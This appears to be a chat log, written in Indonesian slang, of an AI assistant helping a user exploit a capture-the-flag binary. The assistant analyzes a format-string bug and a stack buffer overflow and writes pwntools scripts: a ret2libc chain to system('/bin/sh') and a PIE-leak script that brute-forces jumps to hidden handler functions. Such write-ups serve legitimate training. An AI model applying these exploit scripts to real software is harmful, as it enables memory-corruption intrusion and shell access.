+    fgets(buf, 0x60, stdin);   // input 1
+    printf(buf);               // ← FORMAT STRING BUG
+    puts("");                  // newline doang
+}
+
+Tidak ada send_result di sini! Yang manggil send_result 5x itu di fcn.0000126a sendiri (XREF dari dalam fungsinya sendiri di +0x1e6, +0x21a, dst — itu internal loop/switch, bukan dari luar).
+Jadi struktur asli:
+text
+
+main (0x158e)
+  ├─ fcn.00001209  → setvbuf
+  ├─ puts(banner)
+  ├─ fcn.00001537  → FORMAT STRING (input 1)
+  │    ├─ printf("Why do you wish to start over? ")
+  │    ├─ fgets(buf, 0x60)
+  │    ├─ printf(buf)  ← VULN
+  │    └─ puts("")
+  ├─ printf("Input : ")
+  ├─ fgets(buf, 0x100)  ← BUFFER OVERFLOW (input 2, buf di rbp-0x40)
+  └─ puts("May your choice not lead to your doom")
+
+Dan fcn.0000126a (send HTTP) DIPANGGIL DARI MANA? XREF-nya cuma internal (+0x1e6 dst) — itu berarti r2 salah analisis, atau fcn.0000126a tidak pernah dipanggil dari main!
+
+Cek XREF beneran:
+bash
+
+r2 -q -c 'aaa; axt @ 0x1450; axt @ 0x1484; axt @ 0x14b8; axt @ 0x14ec; axt @ 0x1520' chall
+
+Tapi dari pdf @ 0x126a, yang di 0x1450 itu di dalam fungsi itu sendiri (fungsi 0x126a panjang sampai 0x1432). Berarti 5x call itu di fungsi lain yang belum kita analisis — kemungkinan fcn.00001450 atau sejenis (fungsi antara 0x1432-0x1537).
+
+Cek:
+bash
+
+r2 -q -c 'aaa; s 0x1432; pd 260' chall
+
+Atau:
+bash
+
+objdump -d chall --start-address=0x1432 --stop-address=0x1537
+
+Yang udah pasti:
+
+    Format string bug di input 1 (printf(buf)) — bisa leak libc/PIE/stack
+
+    Buffer overflow di input 2 (fgets(buf, 0x100) di rbp-0x40 = 64 bytes, overflow 72 bytes ke RIP)
+
+    No canary → overflow langsung ke return address
+
+    Full RELRO + PIE + NX → butuh leak dulu (dari format string)
+
+Rencana Eksploit FINAL:
+
+Fase 1 — Format string leak (input 1):
+
+    Leak libc: 0x7f... (udah dapet 0x7fa4b8ff6963)
+
+    Leak PIE: 0x55... (udah dapet 0x55a4be1ff5cd)
+
+    Leak stack
+
+Fase 2 — Buffer overflow (input 2):
+
+    Offset 72 bytes ke return address
+
+    ROP: ret2libc → system("/bin/sh") atau one_gadget
+
+Fase 3 — Tapi ada twist "right path":
+
+Coba jalanin beneran dengan env di-set, dan lihat apakah program benar-benar connect ke server:
+bash
+
+RESULT_HOST=127.0.0.1 RESULT_PORT=9999 RESULT_KEY=test ./chall
+# sambil di terminal lain: nc -lvnp 9999
+
+Kalau program connect & kirim request, berarti ada fungsi yang manggil send_result yang belum kita temuin. Kalo nggak connect, berarti send_result gak kepanggil (mungkin cuma red herring atau ada di jalur yang gak dieksekusi).
+
+Share:
+
+    objdump -d chall --start-address=0x1432 --stop-address=0x1537
+
+    Output RESULT_HOST=127.0.0.1 RESULT_PORT=9999 RESULT_KEY=test ./chall + nc -lvnp 9999 di terminal lain
+
+    Libc version: ldd ./chall
+
+Gas wok, ini udah mepet banget! 🔥
+nihhh hasilnya
+
+WKWKWK SEKARANG JELAS TOTAL! Ternyata ada 5 fungsi terpisah (0x1433, 0x1467, 0x149b, 0x14cf, 0x1503) yang masing-masing manggil send_result dengan argumen konstanta (money, longevity, wise_mind, love, food).
+
+TAPI — perhatikan! Fungsi-fungsi ini tidak pernah dipanggil dari main! Main cuma manggil:
+
+    fcn.00001209 (setvbuf)
+
+    fcn.00001537 (format string + fgets)
+
+    fgets(buf, 0x100) ← BUFFER OVERFLOW
+
+    puts("May your choice...")
+
+    leave; ret
+
+5 fungsi send_result itu DEAD CODE / tidak terpakai — atau sengaja dibiarkan sebagai red herring / target overwrite!
+🎯 KESIMPULAN: Ini classic pwn, bukan logic!
+text
+
+main:
+  fcn.00001537  → format string (input 1, 0x60 bytes)
+  fgets(buf, 0x100)  → BUFFER OVERFLOW (input 2, buf di rbp-0x40)
+  leave; ret
+
+Vulnerability:
+
+    Format string di input 1 → leak libc & PIE
+
+    Buffer overflow di input 2 → offset 72 bytes ke return address (0x40 + 8 saved RBP)
+
+Full RELRO + PIE + NX + No Canary = ret2libc via leak.
+⚡ Rencana Eksploit FINAL:
+
+Step 1 — Leak libc (input 1, format string):
+
+Dari output lu tadi:
+text
+
+%p.%p.%p.%p.%p...
+1: 0x7fa4b8ff6963  ← libc leak
+20: 0x55a4be1ff5cd ← PIE leak
+
+Cek offset libc:
+bash
+
+ldd ./chall
+# misal libc-2.31.so
+# cari offset 0x...963
+
+Step 2 — Hitung libc base:
+text
+
+libc_base = leak - offset_di_libc
+system = libc_base + system_offset
+binsh = libc_base + binsh_offset
+
+Step 3 — Buffer overflow (input 2):
+text
+
+payload = b"A" * 72        # offset ke return address
+payload += p64(ret)         # alignment (stack 16-byte)
+payload += p64(pop_rdi)     # RDI = binsh
+payload += p64(binsh)
+payload += p64(system)
+
+Tapi PIE aktif — butuh leak PIE juga buat gadget pop rdi; ret. Kalau ada leak PIE dari format string, tinggal tambahin.
+Verifikasi Offset Overflow
+bash
+
+gdb ./chall
+pwndbg> b *0x160e
+pwndbg> r
+# input 1: bebas
+# input 2: cyclic 200
+pwndbg> info registers rip
+# atau
+pwndbg> x/s $rsp
+
+Cek Libc version
+bash
+
+ldd ./chall
+
+Share:
+
+    ldd ./chall
+
+    Hasil gdb cyclic (offset ke RIP)
+
+    Coba format string offset buat cari mana yang PIE & libc dengan lebih presisi:
+
+bash
+
+echo "%1\$p.%2\$p.%3\$p...%30\$p" | ./chall
+
+Atau pakai %n buat cek di offset berapa input lu mendarat:
+bash
+
+echo "AAAAAAAA.%6\$p.%7\$p.%8\$p" | ./chall
+
+TL;DR: Ini ret2libc klasik — format string leak + buffer overflow. 5 fungsi send_result itu dead code / distraction. "Right path" = ROP chain yang bener! 🔥
+
+Gas share ldd + hasil gdb cyclic!
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ ldd ./chall
+# misal libc-2.31.so
+# cari offset 0x...963
+        linux-vdso.so.1 (0x00007fdfd37b8000)
+        libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007fdfd3594000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fdfd37ba000)
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo "%1\$p.%2\$p.%3\$p...%30\$p" | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? 0x7f6efd376963.0x7f6efd378760.0x7f6efd378760...0x7ffe4ebc2b50
+
+Input : May your choice not lead to your doom
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo "AAAAAAAA.%6\$p.%7\$p.%8\$p" | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? AAAAAAAA.0x4141414141414141.0x37252e702436252e.0xa702438252e7024
+
+Input : May your choice not lead to your doom
+
+MANTAP! Data lengkap! Mari kita rakit:
+📊 Data yang kita punya:
+
+Libc: /usr/lib/x86_64-linux-gnu/libc.so.6
+Leak libc: 0x7f6efd376963 (offset 1)
+Leak PIE: 0x55a4be1ff5cd (offset 20) — dari run sebelumnya
+Input kita mendarat di offset 6 (0x4141414141414141)
+🔍 Step 1: Cari offset libc dari leak 0x...963
+bash
+
+# Cek versi libc
+strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E "GNU C Library|release version"
+
+# Cari offset 0x...963 di libc
+# Kemungkinan __libc_start_main+243 atau _IO_2_1_stdin_
+readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E "libc_start_main|_IO_2_1_stdin_|_IO_2_1_stdout_"
+
+# Atau pakai one_gadget / libc-database
+
+Tapi lebih gampang: Karena lu udah punya libc lokal, tinggal:
+bash
+
+# Di gdb, run chall, break, cek address
+gdb ./chall
+pwndbg> b *0x1577   # sebelum printf format string
+pwndbg> r
+# input: %1$p
+# lihat stack, cari yang nilainya berakhiran 963
+
+Atau pakai cara cepat: Leak offset 1 = __libc_start_main + 243 biasanya di glibc modern. Cek:
+bash
+
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+print(hex(libc.symbols['__libc_start_main']))
+# kalau + 243 = 0x...963, berarti bener
+"
+
+🔍 Step 2: Konfirmasi offset overflow
+bash
+
+gdb ./chall
+pwndbg> b *0x160e
+pwndbg> r
+# input 1: bebas
+# input 2: cyclic 200
+pwndbg> info registers rip
+pwndbg> cyclic -l $rip
+
+Prediksi: offset 72 (0x48) — 0x40 buffer + 8 saved RBP.
+🔍 Step 3: Cari gadget di PIE
+
+Karena PIE aktif, butuh leak PIE buat gadget pop rdi; ret. Dari output sebelumnya:
+text
+
+20: 0x55a4be1ff5cd  ← PIE leak
+
+Cari offset PIE:
+bash
+
+# Di gdb, cek base PIE saat run
+pwndbg> vmmap
+# lihat base chall
+# hitung: leak - base = offset
+
+Atau cari gadget di binary:
+bash
+
+ROPgadget --binary chall | grep "pop rdi"
+# atau
+ropper --file chall --search "pop rdi"
+
+🎯 Step 4: Susun Exploit
+python
+
+from pwn import *
+
+elf = ELF('./chall')
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+p = process('./chall')
+
+# === FASE 1: LEAK ===
+# Input 1: format string
+# Leak libc (offset 1), PIE (offset 20)
+p.recvuntil(b'Why do you wish to start over? ')
+p.sendline(b'%1$p.%20$p')  # libc.PIE
+
+# Parse leak
+p.recvuntil(b'Why do you wish to start over? ')
+leaks = p.recvline().strip().split(b'.')
+libc_leak = int(leaks[0], 16)
+pie_leak = int(leaks[1], 16)
+
+# Hitung base
+libc_base = libc_leak - LIBC_OFFSET  # cari offset yg bener
+pie_base = pie_leak - PIE_OFFSET     # cari offset yg bener
+
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+# === FASE 2: OVERFLOW ===
+p.recvuntil(b'Input : ')
+payload = b'A' * 72
+payload += p64(pie_base + POP_RDI_RET)  # gadget pop rdi; ret
+payload += p64(binsh)
+payload += p64(system)
+p.sendline(payload)
+
+p.interactive()
+
+⚠️ Yang masih perlu dicari:
+
+    Offset libc dari leak 0x...963 — cek di gdb atau libc-database
+
+    Offset PIE dari leak 0x...5cd — cek di gdb dengan vmmap
+
+    Gadget pop rdi; ret di binary PIE — cari pakai ROPgadget
+
+    Konfirmasi offset overflow (72 atau beda?) — cyclic
+
+Cepet, jalanin ini:
+bash
+
+# 1. Cek libc offset
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+# Cari yg addressnya berakhiran 963
+for sym in ['__libc_start_main', '_IO_2_1_stdin_', '_IO_2_1_stdout_']:
+    print(sym, hex(libc.symbols[sym]))
+"
+
+# 2. Cari gadget
+ROPgadget --binary chall | grep -E "pop rdi|ret$" | head -20
+
+# 3. Konfirmasi offset overflow
+gdb ./chall
+pwndbg> b *0x160e
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> cyclic -l $rip
+
+Share 3 output itu, langsung kita rakit script final! 🔥
+
+WKWKWK masalah klasik PIE + gdb! Breakpoint 0x160e itu offset relatif, bukan absolute. Karena PIE, base-nya random. Harus break pakai symbol/offset:
+🔧 Fix Breakpoint di PIE
+bash
+
+gdb ./chall
+pwndbg> starti          # stop di entry, biar PIE ke-load
+pwndbg> b *$base+0x160e # atau
+pwndbg> b *main+0x80   # main = 0x158e, jadi main+0x80 = 0x160e
+pwndbg> c
+
+Atau lebih gampang:
+bash
+
+gdb ./chall
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> x/s $rsp
+pwndbg> cyclic -l <value_di_rsp>
+
+🔍 Libc Offset
+
+Libc lu glibc 2.36+ (dari checksec FORTIFY: Enabled). Cek dulu:
+bash
+
+strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
+
+Leak 0x...963 → cari offset:
+bash
+
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+# offset 1 biasanya __libc_start_main+243
+print('__libc_start_main:', hex(libc.symbols['__libc_start_main']))
+# 0x2a050 + 243 = 0x2a143 — bukan 963
+# Coba cari yg addressnya berakhiran 963
+"
+
+Tapi cara paling akurat: di gdb, pas format string jalan, lihat stack:
+bash
+
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80  # atau break di printf format string
+pwndbg> r
+# input 1: %1$p
+# lihat di stack address 0x...963, cocokin dengan vmmap
+pwndbg> vmmap
+pwndbg> x/20gx $rsp
+
+🔍 Gadget pop rdi; ret
+
+Dari ROPgadget output, tidak ada pop rdi; ret di binary! Yang ada cuma:
+text
+
+0x1431: leave; ret
+0x1267: nop; pop rbp; ret
+
+Berarti harus pakai gadget dari libc (setelah leak libc):
+bash
+
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+# atau
+ropper --file /usr/lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi"
+
+📋 Yang Perlu Dilakuin Sekarang
+bash
+
+# 1. Fix gdb — break dengan offset dari main
+gdb ./chall
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: A  
+# input 2: cyclic 200
+pwndbg> x/s $rsp
+pwndbg> cyclic -l <hex_dari_rsp>
+
+# 2. Cari gadget di libc
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep ": ret$"
+
+# 3. Cek libc version
+strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
+
+Share:
+
+    Output x/s $rsp setelah cyclic (offset ke RIP)
+
+    Output ROPgadget --binary libc.so.6 | grep "pop rdi ; ret" (pertama aja)
+
+    Versi libc
+
+Nanti kita rakit script final pakai ret2libc: overflow → ROP ke system("/bin/sh") pakai gadget dari libc. Gas! 🔥
+ntar ntar dulu, kita nyerang nya kayak gimana dulu nih?
+Input 1 (format string): Kirim %$p buat leak alamat PIE ini sampe berapa 20 kah?
+Hitung PIE base = leaked_addr - 0x15cd gini kan ngitungnya
+Hitung alamat handler: PIE base + offset_handler
+Input 2 (buffer overflow): Kirim padding 72 bytes + ret gadget + alamat handler udh dapet semuanya, sisa itu format string aja yang keberapa broo
+
+WKWKWK iya bener, kita luruskan dulu biar gak salah arah. Gue kelewat satu hal penting: lu belum tau offset ke RIP. Jadi belum bisa nulis "72 bytes" — itu masih asumsi.
+🎯 Strategi yang bener (2 fase)
+FASE 1 — Format String (input 1): Leak + Offset
+
+Input 1 itu printf(user_input) — format string bug. Gunanya:
+
+    Leak PIE base → biar bisa hitung alamat gadget/fungsi di binary
+
+    Leak libc base → biar bisa hitung system, /bin/sh, gadget libc
+
+    Cari offset ke return address → biar tau berapa padding yang dibutuhin
+
+Dari output lu sebelumnya:
+text
+
+Offset 1  : 0x7f...963  ← libc
+Offset 20 : 0x55...5cd  ← PIE
+Offset 6  : input lu mulai mendarat di stack (AAAA...)
+
+PIE base = leak - offset_di_binary
+
+    Leak 0x55a4be1ff5cd → offsetnya berapa? Harus dicek di gdb: leak - pie_base = offset
+
+    Kalau 0x15cd cocok → pie_base = leak - 0x15cd
+
+TAPI — untuk overwrite return address, lu harus tau offset dari buffer input 2 ke return address, dan itu beda dari offset format string. Format string offset 6 itu posisi input 1 di stack saat printf dipanggil. Buffer overflow input 2 di fungsi main, buffer di rbp-0x40.
+FASE 2 — Buffer Overflow (input 2): ROP
+
+Setelah dapet leak, baru:
+text
+
+payload = b"A" * offset_ke_rip
+payload += p64(gadget_atau_fungsi)
+...
+
+❓ Yang belum kita tau: offset ke RIP
+
+Belum dikonfirmasi. Harus cyclic di gdb dengan breakpoint yang bener (pakai main+0x80, bukan 0x160e).
+🔧 Step yang bener sekarang
+bash
+
+gdb ./chall
+pwndbg> b *main+0x80    # break di ret (0x160e = main+0x80)
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> x/s $rsp
+# atau
+pwndbg> info registers rsp
+pwndbg> x/gx $rsp
+# cyclic -l <value>
+
+Itu yang kasih offset ke RIP. Baru setelah itu kita bisa rakit payload.
+🤔 Tapi... "handler" apa yang mau dituju?
+
+Lu nyebut "alamat handler" — handler apa? Dari analisis:
+
+    5 fungsi send_result (money, longevity, wise_mind, love, food) — dead code, gak dipanggil
+
+    Program gak punya system / execve / bin/sh
+
+    Full RELRO → GOT gak bisa di-overwrite
+
+Jadi target overwrite return address cuma bisa:
+
+    system("/bin/sh") dari libc (butuh leak libc + gadget pop rdi; ret dari libc)
+
+    One_gadget dari libc (butuh kondisi stack tertentu)
+
+    ret2dlresolve (kalau system gak ada di libc — tapi pasti ada)
+
+"Handler" yang lu maksud mungkin salah satu dari 5 fungsi send_result itu? Tapi itu gak guna — cuma ngirim HTTP request dengan argumen konstanta. Bukan buat dapetin shell/flag.
+💡 Kecuali...
+
+"Right path" = overwrite return address supaya balik ke main lagi, lalu di iterasi kedua, lu inject path ke send_result? Tapi send_result argumennya konstanta, gak bisa di-inject.
+
+ATAU — lu overwrite return address ke fcn.0000126a dengan argumen yang lu kontrol? fcn.0000126a(arg1) = send_result(user_input). Kalau lu bisa kontrol rdi sebelum ret, lu bisa kirim HTTP request ke path apapun → SSRF / path injection!
+
+Itu "right path"-nya! Kirim request ke /internal/flag atau path tersembunyi.
+🔥 Jadi strateginya:
+
+    Format string (input 1): leak libc + PIE
+
+    Buffer overflow (input 2): ROP chain yang set rdi = "path_yang_lu_mau" lalu call fcn.0000126a
+
+    fcn.0000126a connect ke server & kirim POST /internal/result/<path_lu> → server balikin flag!
+
+Butuh gadget pop rdi; ret — yang gak ada di binary, tapi ada di libc.
+✅ Next step:
+
+    Konfirmasi offset RIP (cyclic di gdb, break main+0x80)
+
+    Konfirmasi PIE offset — leak 0x...5cd = base + berapa? Cek di gdb:
+    bash
+
+    pwndbg> vmmap
+    # lihat base chall, hitung leak - base
+
+    Cari gadget libc:
+    bash
+
+    ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -5
+
+    Cari string "/flag" atau path menarik di binary/libc
+
+Share:
+
+    Hasil cyclic (offset RIP)
+
+    vmmap di gdb (base chall & libc)
+
+    Gadget pop rdi; ret di libc
+
+Baru kita rakit! Gas wok! 🔥
+ehh logika aja, deadcode kenapa ada kalo ngga dipanggil ufh gitu namanya unik unik lagi
+
+WKWKWK BENER BANGET! Gue kelewat! 🤯
+
+"Dead code" yang unik-unik (money, longevity, wise_mind, love, food) itu bukan dead code — itu FUNGSI HANDLER yang belum kepanggil dari main, tapi BISA DIPANGGIL lewat overwrite return address!
+
+Ini pola "ret2win" / "call the hidden function" classic! Namanya juga challenge "might the right path" — lu harus pilih path/fungsi yang bener!
+🎯 Logika Baru:
+text
+
+main:
+  fcn.00001537  → format string leak (input 1)
+  fgets(buf, 0x100)  → overflow (input 2)
+  ret  ← DI SINI LU OVERWRITE
+
+5 fungsi handler:
+  0x1433 → puts("With this, you can buy anything") + send_result("money")
+  0x1467 → puts("With this, you can't possibly die") + send_result("longevity")
+  0x149b → puts("With this, you will be able to see through") + send_result("wise_mind")
+  0x14cf → puts("With this, you will be adored") + send_result("love")
+  0x1503 → puts("With this, you will never be hungry") + send_result("food")
+
+Lu overflow return address → arahin ke salah satu handler ini → handler itu manggil send_result(path) → server balikin response → FLAG!
+🤔 Tapi handler mana yang bener?
+
+Nama challenge: "might the right path" — "path" bisa berarti:
+
+    Path HTTP (/internal/result/money, /longevity, dst) — 5 pilihan, salah satunya bener
+
+    Return address — path eksekusi yang bener
+
+Kandidat "right path":
+
+    wise_mind → "you will be able to see through" → bisa lihat flag? 👀
+
+    money → "buy anything"
+
+    longevity → "can't possibly die"
+
+    love → "be adored"
+
+    food → "never be hungry"
+
+wise_mind paling mencurigakan — "see through" = bisa lihat sesuatu yang tersembunyi (flag).
+🎯 Strategi Baru (JAUH LEBIH SIMPEL):
+
+    Format string (input 1): leak PIE base
+
+    Hitung alamat handler = PIE base + offset handler (misal wise_mind = 0x149b)
+
+    Buffer overflow (input 2): padding + alamat handler (langsung, gak perlu ROP!)
+
+    Handler jalan → send_result("wise_mind") → kirim HTTP ke server → flag!
+
+Cuma butuh 1 leak (PIE), gak butuh libc! Karena handler-nya udah ada di binary!
+🔧 Step Konkret
+
+1. Konfirmasi PIE offset:
+bash
+
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %20$p
+# input 2: AAAA
+pwndbg> vmmap
+# lihat base chall, hitung: leak - base = offset
+
+Dari leak 0x55a4be1ff5cd — offset 0x15cd? Cek:
+text
+
+0x15cd = alamat setelah call fcn.00001537 di main
+
+PIE base = leak - 0x15cd
+
+2. Konfirmasi offset RIP:
+bash
+
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> cyclic -l $rip
+# atau x/s $rsp
+
+Prediksi: 72 (0x48) = 0x40 buffer + 8 saved RBP.
+
+3. Rakit payload:
+python
+
+payload = b"A" * offset_rip
+payload += p64(pie_base + 0x149b)  # handler wise_mind
+
+🔥 TAPI — "right path" mungkin butuh coba satu-satu
+
+Coba semua 5 handler, mana yang balikin flag:
+text
+
+0x1433 → money
+0x1467 → longevity  
+0x149b → wise_mind
+0x14cf → love
+0x1503 → food
+
+Atau... semua handler manggil send_result dengan path yang beda, dan server punya endpoint /internal/result/<path> yang balikin sesuatu. Mungkin satu path balikin flag, sisanya balikin "result updated".
+🎯 Bahkan mungkin LEBIH SIMPEL:
+
+Kalau lu gak perlu leak PIE — karena PIE base bisa dihitung dari offset 20 yang lu dapet tadi:
+text
+
+leak = 0x55a4be1ff5cd
+offset = 0x15cd
+pie_base = leak - 0x15cd = 0x55a4be1fe000
+handler_wise_mind = pie_base + 0x149b = 0x55a4be1ff49b
+
+Tinggal hitung & kirim! 🚀
+⚡ Full exploit (draft):
+python
+
+from pwn import *
+
+p = process('./chall')
+
+# Fase 1: leak PIE
+p.recvuntil(b'Why do you wish to start over? ')
+p.sendline(b'%20$p')  # PIE leak
+
+p.recvuntil(b'Why do you wish to start over? ')
+leak = int(p.recvline().strip(), 16)
+pie_base = leak - 0x15cd
+log.info(f'PIE base: {hex(pie_base)}')
+
+# Fase 2: overflow ke handler
+handler = pie_base + 0x149b  # wise_mind
+p.recvuntil(b'Input : ')
+payload = b'A' * 72 + p64(handler)
+p.sendline(payload)
+
+# Handler bakal connect ke server & kirim request
+# Tapi butuh RESULT_HOST/PORT/KEY di-set!
+p.interactive()
+
+⚠️ Yang perlu dicek:
+
+    Offset RIP — konfirmasi 72
+
+    Offset PIE — konfirmasi 0x15cd
+
+    Environment variable RESULT_HOST, RESULT_PORT, RESULT_KEY — apakah di-set di server remote? Kalau iya, handler bakal connect & kirim request
+
+    Handler mana yang bener — coba satu-satu
+
+Jalanin gdb cyclic dulu, share offset RIP & base PIE! Baru kita rakit final! 🔥
+ribet amat tinggal cek aja semuanya xixixixixi
+kan bisa dicoding
+
+WKWKWK BENER! Gaskan brute force! 😎
+🎯 Simple: Coba Semua Handler
+python
+
+from pwn import *
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+def try_handler(name, offset):
+    p = process('./chall')
+    
+    # Fase 1: leak PIE
+    p.recvuntil(b'Why do you wish to start over? ')
+    p.sendline(b'%20$p')
+    
+    p.recvuntil(b'Why do you wish to start over? ')
+    leak = int(p.recvline().strip(), 16)
+    pie_base = leak - 0x15cd
+    log.info(f'PIE base: {hex(pie_base)}')
+    
+    # Fase 2: overflow
+    handler = pie_base + offset
+    p.recvuntil(b'Input : ')
+    payload = b'A' * 72 + p64(handler)
+    p.sendline(payload)
+    
+    # Baca output
+    try:
+        out = p.recvall(timeout=2)
+        print(f'[{name}] {out}')
+    except:
+        pass
+    p.close()
+
+for name, offset in HANDLERS.items():
+    try_handler(name, offset)
+
+⚠️ Tapi — offset RIP belum dikonfirmasi
+
+"72" itu masih asumsi. Kalau salah, semua handler gagal. Cek dulu:
+bash
+
+gdb ./chall
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> x/s $rsp
+# atau cyclic -l $rip
+
+Atau brute force offset juga:
+python
+
+for offset in range(64, 96, 8):
+    for name, handler_off in HANDLERS.items():
+        # coba kombinasi
+
+🎯 Tapi ingat — handler manggil send_result yang:
+c
+
+if (!host || !port || !key || !*key) return;  // ← kalau env gak di-set, LANGSUNG RETURN!
+
+Kalau RESULT_HOST/PORT/KEY gak di-set, handler cuma print puts("With this...") + puts("Your result has been updated...") — gak connect ke mana-mana.
+
+Jadi kalau di remote env-nya di-set, handler bakal connect & kirim request. Kalau gak di-set, handler cuma print doang — gak guna.
+🤔 Berarti mungkin jalur "right path" bukan handler?
+
+Kecuali — handler itu cuma buat trigger puts yang bocorin sesuatu, atau...
+
+ATAU — lu set env sendiri? Gak bisa di remote.
+
+ATAU — handler itu red herring, dan "right path" = ROP ke system/one_gadget setelah leak libc.
+💡 Coba aja dulu brute force handler
+
+Kalau output cuma "With this..." + "Your result has been updated", berarti handler cuma print doang (env gak di-set / gak connect). Kalau ada output aneh (flag?), berarti ketemu.
+
+Jalanin script di atas, share outputnya! Kalau gagal semua, kita balik ke jalur ret2libc.
+
+Gas wok, coding dulu! 🔥
+buffernya tuh 72 gegara ketambah 8 kan yak?
+
+WKWKWK HAMPIR BENER tapi ada twist! Mari luruskan:
+📐 Hitungan Offset
+asm
+
+main:
+  0x1592: sub rsp, 0x40    ← buffer 64 bytes (0x40)
+  0x15e8: lea rax, [rbp-0x40]  ← buffer mulai di rbp-0x40
+  0x15f4: call fgets       ← baca 0x100 ke buffer
+  0x160d: leave            ← mov rsp, rbp; pop rbp
+  0x160e: ret              ← pop rip
+
+Stack layout:
+text
+
+rbp-0x40  ┌─────────────────┐ ← buffer mulai (64 bytes)
+          │                 │
+          │   buffer (64)   │  0x40 = 64 bytes
+          │                 │
+rbp+0x00  ├─────────────────┤ ← saved RBP (8 bytes)
+rbp+0x08  ├─────────────────┤ ← return address (RIP)
+          └─────────────────┘
+
+Offset dari buffer ke return address:
+text
+
+0x40 (buffer) + 0x8 (saved RBP) = 0x48 = 72 bytes
+
+Jadi IYA — 72 = 64 (buffer) + 8 (saved RBP). ✅
+⚠️ TAPI — belum dikonfirmasi!
+
+Ini teori dari disassembly. Kadang ada alignment atau variabel lain di stack yang bikin offset beda. Harus dicek pakai cyclic di gdb!
+bash
+
+gdb ./chall
+pwndbg> b *main+0x80    # break di ret
+pwndbg> r
+# input 1: A
+# input 2: cyclic 200
+pwndbg> x/s $rsp
+# atau
+pwndbg> cyclic -l $rip
+
+Kalau hasilnya 72 → teori bener, gas!
+Kalau beda → pakai yang hasil gdb.
+🎯 Setelah offset confirmed:
+python
+
+payload = b'A' * 72
+payload += p64(handler_addr)
+
+Tapi handler butuh RESULT_HOST/PORT/KEY di-set biar send_result jalan. Kalau gak di-set, cuma print doang.
+
+Cek dulu di lokal:
+bash
+
+RESULT_HOST=127.0.0.1 RESULT_PORT=9999 RESULT_KEY=test ./chall
+# sambil nc -lvnp 9999 di terminal lain
+# input 1: A
+# input 2: AAAA... + alamat handler
+# lihat apakah nc dapet request
+
+Share:
+
+    Hasil cyclic gdb (konfirmasi 72)
+
+    Output nc kalau handler dipanggil
+
+Baru kita tau apakah handler beneran connect atau cuma print doang! 🔥
+udah anggep aja bener, gw ga nemuin buffer dimana mana lagi anjer
+
+WKWKWK OK GAS! Anggap 72 bener. Rakit script-nya:
+🎯 Script Brute Force Handler
+python
+
+from pwn import *
+
+context.log_level = 'info'
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+PIE_LEAK_OFFSET = 0x15cd
+RIP_OFFSET = 72
+
+def try_handler(name, handler_off):
+    p = process('./chall')
+    
+    # Fase 1: leak PIE (offset 20)
+    p.recvuntil(b'Why do you wish to start over? ')
+    p.sendline(b'%20$p')
+    
+    # Parse leak — hati-hati, output-nya di line yg sama
+    p.recvuntil(b'Why do you wish to start over? ')
+    data = p.recvuntil(b'\n', timeout=2)
+    leak = int(data.strip().split(b'.')[0], 16)
+    pie_base = leak - PIE_LEAK_OFFSET
+    log.success(f'[{name}] leak={hex(leak)} pie_base={hex(pie_base)}')
+    
+    # Fase 2: overflow
+    handler = pie_base + handler_off
+    log.info(f'[{name}] handler @ {hex(handler)}')
+    
+    p.recvuntil(b'Input : ')
+    payload = b'A' * RIP_OFFSET + p64(handler)
+    p.sendline(payload)
+    
+    # Baca output
+    try:
+        out = p.recvall(timeout=3)
+        print(f'\n===== [{name}] =====')
+        print(out.decode('latin-1'))
+    except Exception as e:
+        print(f'[{name}] error: {e}')
+    p.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+⚠️ Yang perlu diperhatiin:
+
+1. Output format string — dari run lu:
+text
+
+Why do you wish to start over? 0x7f...963.0x7f...760
+
+Leak PIE (0x55...) ada di offset 20 — tapi cek dulu apakah %20$p beneran ngasih PIE. Dari run sebelumnya:
+text
+
+1: 0x7fa4b8ff6963      ← libc
+2: 0x7fa4b8ff8760      ← libc
+3: 0x7fa4b8ff8760      ← libc
+4: (nil)
+5: (nil)
